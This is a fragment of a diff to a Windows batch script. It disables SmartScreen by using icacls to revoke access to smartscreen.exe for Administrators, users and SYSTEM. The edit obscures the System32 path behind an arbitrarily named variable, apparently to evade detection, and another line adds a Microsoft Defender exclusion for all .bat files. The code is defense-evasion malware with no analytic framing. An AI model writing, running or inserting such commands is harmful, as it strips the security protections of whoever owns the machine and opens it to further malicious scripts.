@@ -28,7 +28,7 @@ set xxx=%systemroot%
 set i-love-you-hande-ercel=System32
 
 
-icacls "%xxx%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+icacls "%xxx%\%i-love-you-hande-ercel%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
